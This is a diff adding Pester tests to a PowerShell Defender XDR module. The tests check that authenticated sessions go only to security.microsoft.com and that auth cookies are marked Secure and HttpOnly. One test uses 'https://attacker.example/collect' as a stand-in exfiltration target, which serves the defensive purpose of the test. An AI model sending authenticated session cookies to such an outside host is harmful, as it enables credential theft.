@@ -63,6 +63,32 @@
     }
 }
 
+Describe 'Defender authenticated request boundaries' {
+    It 'rejects an untrusted host before updating or sending the authenticated session' {
+        Mock Update-XdrConnectionSettings {} -ModuleName XDRInternals
+        Mock Invoke-RestMethod { throw 'must not be called' } -ModuleName XDRInternals
+
+        { Invoke-XdrRestMethod -Uri 'https://attacker.example/collect' } |
+            Should -Throw '*only sends an authenticated session to https://security.microsoft.com*'
+        Should -Invoke Update-XdrConnectionSettings -ModuleName XDRInternals -Times 0 -Exactly
+        Should -Invoke Invoke-RestMethod -ModuleName XDRInternals -Times 0 -Exactly
+    }
+
+    It 'marks manually supplied Defender authentication cookies as secure' {
+        Mock Set-XdrCache {} -ModuleName XDRInternals
+        Mock Write-Host {} -ModuleName XDRInternals
+
+        InModuleScope XDRInternals {
+            Set-XdrConnectionSettings -SccAuth 'sccauth-value' -Xsrf 'xsrf-value' -TenantId '8612f621-73ca-4c12-973c-0da732bc44c2'
+
+            $cookies = $script:session.Cookies.GetCookies('https://security.microsoft.com')
+            $cookies['sccauth'].Secure | Should -BeTrue
+            $cookies['sccauth'].HttpOnly | Should -BeTrue
+            $cookies['XSRF-TOKEN'].Secure | Should -BeTrue
+        }
+    }
+}
+
 Describe 'Connect-XdrByPhoneSignIn' {
     BeforeEach {
         Mock Read-Host { 'user@contoso.com' } -ModuleName XDRInternals
